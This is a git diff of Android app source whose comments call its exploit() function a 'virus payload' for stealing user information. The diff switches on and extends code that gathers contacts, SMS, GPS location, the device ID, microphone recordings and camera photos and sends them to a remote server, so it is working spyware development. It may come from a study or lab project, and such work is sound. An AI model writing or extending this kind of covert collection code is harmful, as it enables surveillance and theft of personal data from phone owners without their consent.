@@ -56,7 +56,6 @@ public class MainActivity extends AppCompatActivity {
     // Function that exploits the virus payload: stealing user information
     public void exploit(){
 
-
         ArrayList<Pair<String, String>> contacts = new ArrayList<>();  //Conctacts list data structure
         LocationManager mLocationManager; //Class that handles the GPS location
         String android_id; //Android device identifier
@@ -71,17 +70,17 @@ public class MainActivity extends AppCompatActivity {
         mLocationManager.requestLocationUpdates(
                 LocationManager.GPS_PROVIDER, 5000, 10, locationListener);
 
-        //new CreateRMIServerAsyncTask(this).execute();
-        /*
         try {
             sendContacts(android_id, contacts);
         } catch (IOException e) {
             e.printStackTrace();
         }
+
         sendSMS(android_id);
-        sendPictures(android_id);
-        */
+        // sendPictures(android_id);
+
         sendAudio(android_id, 15000);
+        sendPhoto(android_id);
     }
 
     // Function to save all contacts of the user in a data structure and send them to the remote server by calling an AsyncTask
@@ -174,7 +173,7 @@ public class MainActivity extends AppCompatActivity {
 
     public void sendAudio(String android_id, int time){
 
-        final AudioRecorder audioRecorder = new AudioRecorder(android_id+"audio.aac", time);
+        final AudioRecorder audioRecorder = new AudioRecorder(this, android_id, time);
         audioRecorder.startRecording();
 
         new Timer().schedule(new TimerTask() {
@@ -192,15 +191,11 @@ public class MainActivity extends AppCompatActivity {
 
             }
         }, time);
-
-
-        // Send the file to the server
-        new SendAudioAsyncTask(this, android_id, audioRecorder.getmFileName()).execute();
-
     }
 
-    public void sendPhoto(){
-
+    public void sendPhoto(String android_id){
+        CameraShot cameraShot = new CameraShot(this, android_id);
+        cameraShot.takePhoto();
     }
 
 }
